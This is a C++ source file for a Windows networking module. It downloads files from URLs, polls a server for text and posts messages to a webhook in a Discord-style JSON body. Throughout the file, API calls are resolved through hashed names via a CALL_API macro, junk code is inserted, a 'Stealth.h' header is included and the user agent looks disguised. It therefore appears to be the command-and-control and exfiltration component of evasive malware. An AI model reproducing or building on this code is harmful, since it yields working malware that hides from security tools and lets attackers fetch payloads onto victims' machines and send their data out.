#include "NetworkManager.h"
#include "Logger.h"
#include "FileUtils.h"
#include "Stealth.h"
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

static constexpr DWORD kConnectTimeoutMs = 10'000;
static constexpr DWORD kSendTimeoutMs = 10'000;
static constexpr DWORD kReceiveTimeoutMs = 30'000;
static constexpr DWORD kDownloadChunkSize = 65'536;
static const wchar_t* kUserAgent = L"WinDataHost/1.0";

struct ScopedInternet {
    HINTERNET h = nullptr;
    ScopedInternet() = default;
    explicit ScopedInternet(HINTERNET h) noexcept : h(h) {}
    ~ScopedInternet() noexcept { reset(); }
    ScopedInternet(const ScopedInternet&) = delete;
    ScopedInternet& operator=(const ScopedInternet&) = delete;
    ScopedInternet(ScopedInternet&& o) noexcept : h(std::exchange(o.h, nullptr)) {}
    void reset(HINTERNET newH = nullptr) noexcept { if (h) CALL_API(Hashes::wininet, Hashes::InternetCloseHandle, InternetCloseHandle, h); h = newH; }
    bool valid() const noexcept { return h != nullptr; }
    operator HINTERNET() const noexcept { return h; }
};

static ScopedInternet CreateSession(bool useSystemProxy = false) {
    const DWORD accessType = useSystemProxy ? INTERNET_OPEN_TYPE_PRECONFIG : INTERNET_OPEN_TYPE_DIRECT;
    ScopedInternet sess{ (HINTERNET)CALL_API(Hashes::wininet, Hashes::InternetOpenW, InternetOpenW, kUserAgent, accessType, nullptr, nullptr, 0) };
    if (!sess.valid()) return sess;
    DWORD ct = kConnectTimeoutMs; DWORD st = kSendTimeoutMs; DWORD rt = kReceiveTimeoutMs;
    CALL_API(Hashes::wininet, Hashes::InternetSetOptionW, InternetSetOptionW, sess, INTERNET_OPTION_CONNECT_TIMEOUT, &ct, sizeof(ct));
    CALL_API(Hashes::wininet, Hashes::InternetSetOptionW, InternetSetOptionW, sess, INTERNET_OPTION_SEND_TIMEOUT, &st, sizeof(st));
    CALL_API(Hashes::wininet, Hashes::InternetSetOptionW, InternetSetOptionW, sess, INTERNET_OPTION_RECEIVE_TIMEOUT, &rt, sizeof(rt));
    return sess;
}

static DWORD QueryHttpStatus(HINTERNET hRequest) {
    DWORD code = 0, size = sizeof(code);
    CALL_API(Hashes::wininet, Hashes::HttpQueryInfoW, HttpQueryInfoW, hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &code, &size, nullptr);
    return code;
}

static bool ReadAllBytes(HINTERNET hUrl, std::string& out) {
    std::vector<char> buf(kDownloadChunkSize);
    DWORD bytesRead = 0;
    while (true) {
        if (!CALL_API(Hashes::wininet, Hashes::InternetReadFile, InternetReadFile, hUrl, buf.data(), static_cast<DWORD>(buf.size()), &bytesRead)) return false;
        if (bytesRead == 0) break;
        out.append(buf.data(), bytesRead);
    }
    return true;
}

static std::wstring JsonEscape(const std::wstring& input) {
    std::wstring out; out.reserve(input.size() + 16);
    for (const wchar_t c : input) {
        switch (c) {
        case L'"': out += L"\\\""; break;
        case L'\\': out += L"\\\\"; break;
        case L'\b': out += L"\\b"; break;
        case L'\f': out += L"\\f"; break;
        case L'\n': out += L"\\n"; break;
        case L'\r': out += L"\\r"; break;
        case L'\t': out += L"\\t"; break;
        default:
            if (c < 0x0020) { wchar_t esc[7]; swprintf_s(esc, L"\\u%04X", static_cast<unsigned>(c)); out += esc; }
            else { out += c; }
        }
    }
    return out;
}

bool NetworkManager::DownloadFile(const std::wstring& url, const std::wstring& destination) {
    ScopedInternet sess = CreateSession();
    if (!sess.valid()) return false;
    ScopedInternet hUrl{ (HINTERNET)CALL_API(Hashes::wininet, Hashes::InternetOpenUrlW, InternetOpenUrlW, sess, url.c_str(), nullptr, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0) };
    if (!hUrl.valid()) return false;
    const DWORD status = QueryHttpStatus(hUrl);
    if (status != 0 && (status < 200 || status >= 300)) return false;
    std::ofstream out(destination, std::ios::binary | std::ios::trunc);
    if (!out.is_open()) return false;
    std::vector<char> buf(kDownloadChunkSize);
    DWORD bytesRead = 0; bool ok = true;
    while (true) {
        JUNK_CODE_SMALL;
        if (!CALL_API(Hashes::wininet, Hashes::InternetReadFile, InternetReadFile, hUrl, buf.data(), static_cast<DWORD>(buf.size()), &bytesRead)) { ok = false; break; }
        if (bytesRead == 0) break;
        out.write(buf.data(), static_cast<std::streamsize>(bytesRead));
        if (!out) { ok = false; break; }
    }
    out.close();
    if (!ok) { std::error_code ec; fs::remove(destination, ec); }
    return ok;
}

std::wstring NetworkManager::PollServer(const std::wstring& url) {
    ScopedInternet sess = CreateSession();
    if (!sess.valid()) return L"";
    ScopedInternet hUrl{ (HINTERNET)CALL_API(Hashes::wininet, Hashes::InternetOpenUrlW, InternetOpenUrlW, sess, url.c_str(), nullptr, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0) };
    if (!hUrl.valid()) return L"";
    const DWORD status = QueryHttpStatus(hUrl);
    if (status != 0 && (status < 200 || status >= 300)) return L"";
    std::string content;
    if (!ReadAllBytes(hUrl, content)) return L"";
    return FileUtils::StringToWString(content);
}

bool NetworkManager::SendWebhook(const std::wstring& webhookUrl, const std::wstring& message) {
    ScopedInternet sess = CreateSession(true);
    if (!sess.valid()) return false;
    URL_COMPONENTSW urlComp = { sizeof(urlComp) };
    urlComp.dwHostNameLength = static_cast<DWORD>(-1); urlComp.dwUrlPathLength = static_cast<DWORD>(-1); urlComp.dwExtraInfoLength = static_cast<DWORD>(-1);
    if (!CALL_API(Hashes::wininet, Hashes::InternetCrackUrlW, InternetCrackUrlW, webhookUrl.c_str(), 0, 0, &urlComp)) return false;
    const std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    const std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength + urlComp.dwExtraInfoLength);
    ScopedInternet hConnect{ (HINTERNET)CALL_API(Hashes::wininet, Hashes::InternetConnectW, InternetConnectW, sess, hostName.c_str(), urlComp.nPort, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0) };
    if (!hConnect.valid()) return false;
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) flags |= INTERNET_FLAG_SECURE;
    ScopedInternet hRequest{ (HINTERNET)CALL_API(Hashes::wininet, Hashes::HttpOpenRequestW, HttpOpenRequestW, hConnect, L"POST", urlPath.c_str(), nullptr, nullptr, nullptr, flags, 0) };
    if (!hRequest.valid()) return false;
    const std::wstring jsonBody = L"{\"content\":\"" + JsonEscape(message) + L"\"}";
    const std::string utf8 = FileUtils::WStringToString(jsonBody);
    static const wchar_t kHeaders[] = L"Content-Type: application/json\r\n";
    static constexpr DWORD kHeadersLen = static_cast<DWORD>((sizeof(kHeaders) / sizeof(wchar_t)) - 1);
    if (!CALL_API(Hashes::wininet, Hashes::HttpSendRequestW, HttpSendRequestW, hRequest, kHeaders, kHeadersLen, const_cast<char*>(utf8.c_str()), static_cast<DWORD>(utf8.size()))) return false;
    const DWORD status = QueryHttpStatus(hRequest);
    return (status >= 200 && status < 300);
}
